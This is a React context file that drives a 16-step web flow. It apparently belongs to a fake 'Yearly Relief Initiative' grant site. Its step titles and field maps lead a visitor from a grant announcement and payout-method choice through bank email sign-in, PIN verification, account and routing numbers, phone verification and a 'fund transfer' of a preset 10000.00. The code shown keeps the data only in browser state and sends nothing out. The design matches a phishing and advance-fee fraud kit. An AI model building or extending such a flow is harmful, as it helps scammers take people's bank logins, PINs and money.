import React, { createContext, useContext, useState, useEffect } from "react";

export const paymentMethodsMap = {
	"Cash App": {
		icon: "$",
		name: "Cash App account",
		label: "Cash App $Cashtag",
		placeholder: "e.g. $CashSign",
		bg: "#00ca59",
		color: "#fff",
	},
	Zelle: {
		icon: "Z",
		name: "Zelle account",
		label: "Zelle Email or Phone",
		placeholder: "e.g. name@example.com or phone",
		bg: "#6820d7",
		color: "#fff",
	},
	"Apple Pay": {
		icon: "",
		name: "Apple Pay account",
		label: "Apple ID / Phone",
		placeholder: "e.g. name@icloud.com",
		bg: "#050505",
		color: "#fff",
	},
	PayPal: {
		icon: "P",
		name: "PayPal account",
		label: "PayPal Email",
		placeholder: "e.g. name@paypal.com",
		bg: "#0a3a92",
		color: "#fff",
	},
	Venmo: {
		icon: "V",
		name: "Venmo account",
		label: "Venmo Username",
		placeholder: "e.g. @username",
		bg: "#078ef0",
		color: "#fff",
	},
	Chime: {
		icon: "C",
		name: "Chime account",
		label: "Chime ID",
		placeholder: "e.g. $ChimeSign",
		bg: "#1cc278",
		color: "#fff",
	},
	"Cash Mailing": {
		icon: "✉",
		name: "Cash Mailing",
		label: "Mailing Address",
		placeholder: "e.g. 123 Main St, City, ST",
		bg: "#ce9d1d",
		color: "#fff",
	},
	"Wire Transfer": {
		icon: "▣",
		name: "Wire Transfer",
		label: "Account / Routing Number",
		placeholder: "e.g. Routing & Account #",
		bg: "#102756",
		color: "#fff",
	},
	"Wire Check Mailing": {
		icon: "⇥",
		name: "Wire Check Mailing",
		label: "Delivery Address",
		placeholder: "e.g. Full delivery address",
		bg: "#f1d04e",
		color: "#111",
	},
};

export const transferMethodsMap = {
	CashApp: {
		title: "CashApp Transfer",
		label: "CashApp $Cashtag",
		placeholder: "$username",
	},
	Bitcoin: {
		title: "Bitcoin Transfer",
		label: "Bitcoin BTC Address",
		placeholder: "e.g. 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
	},
	"Bank Account": {
		title: "Bank Account Transfer",
		label: "Account / Routing Number",
		placeholder: "e.g. Account & Routing #",
	},
	Zelle: {
		title: "Zelle Transfer",
		label: "Zelle Email or Phone",
		placeholder: "e.g. name@example.com or phone",
	},
	PayPal: {
		title: "PayPal Transfer",
		label: "PayPal Email",
		placeholder: "e.g. user@paypal.com",
	},
	Venmo: {
		title: "Venmo Transfer",
		label: "Venmo Username",
		placeholder: "e.g. @username",
	},
	Other: {
		title: "Other Transfer",
		label: "Account Details",
		placeholder: "e.g. Transfer identifier",
	},
};

export const stepTitles = [
	"Yearly Relief Initiative",
	"Relief Grant Announcement",
	"Payment Method Selection",
	"Payment Account Details",
	"Session Handoff & Security",
	"Invest Bank Email Sign-In",
	"Security PIN Verification",
	"Account Holder Name",
	"Set Security PIN",
	"Bank Dashboard Overview",
	"Phone Verification Security",
	"Network Wallet Dashboard",
	"Award Bonus Notification",
	"Fund Transfer Method",
	"Transfer Account & Amount",
	"Account Activation Notice",
];

const StepperContext = createContext();

export const StepperProvider = ({ children }) => {
	const [currentStep, setCurrentStep] = useState(1);
	const [isCompleted, setIsCompleted] = useState(false);
	const totalSteps = 16;

	const [data, setData] = useState({
		email: localStorage.getItem("userEmail") || "",
		pin: "",
		fullName: "",
		createdPin: "",
		phone: "",
		selectedPaymentMethod:
			localStorage.getItem("selectedPaymentMethod") || "Cash App",
		selectedTransferMethod:
			localStorage.getItem("selectedTransferMethod") || "CashApp",
		demoId: "",
		cashtag: "",
		amount: "10000.00",
	});

	const updateData = (newFields) => {
		setData((prev) => {
			const updated = { ...prev, ...newFields };
			if (newFields.email) {
				localStorage.setItem("userEmail", newFields.email);
			}
			if (newFields.selectedPaymentMethod) {
				localStorage.setItem(
					"selectedPaymentMethod",
					newFields.selectedPaymentMethod,
				);
			}
			if (newFields.selectedTransferMethod) {
				localStorage.setItem(
					"selectedTransferMethod",
					newFields.selectedTransferMethod,
				);
			}
			return updated;
		});
	};

	const goToStep = (stepNumber) => {
		if (stepNumber < 1) stepNumber = 1;
		if (stepNumber > totalSteps) stepNumber = totalSteps;
		setCurrentStep(stepNumber);
		window.scrollTo({ top: 0, behavior: "smooth" });
	};

	const nextStep = () => {
		if (currentStep < totalSteps) {
			goToStep(currentStep + 1);
		} else {
			setIsCompleted(true);
		}
	};

	const prevStep = () => {
		if (currentStep > 1) {
			goToStep(currentStep - 1);
		}
	};

	// Keyboard navigation
	useEffect(() => {
		const handleKeyDown = (e) => {
			if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA")
				return;
			if (e.key === "ArrowRight" || e.key === "PageDown") {
				nextStep();
			} else if (e.key === "ArrowLeft" || e.key === "PageUp") {
				prevStep();
			}
		};
		window.addEventListener("keydown", handleKeyDown);
		return () => window.removeEventListener("keydown", handleKeyDown);
	}, [currentStep]);

	return (
		<StepperContext.Provider
			value={{
				currentStep,
				totalSteps,
				data,
				updateData,
				goToStep,
				nextStep,
				prevStep,
				isCompleted,
				setIsCompleted,
				stepTitles,
				paymentMethodsMap,
				transferMethodsMap,
			}}
		>
			{children}
		</StepperContext.Provider>
	);
};

export const useStepper = () => useContext(StepperContext);
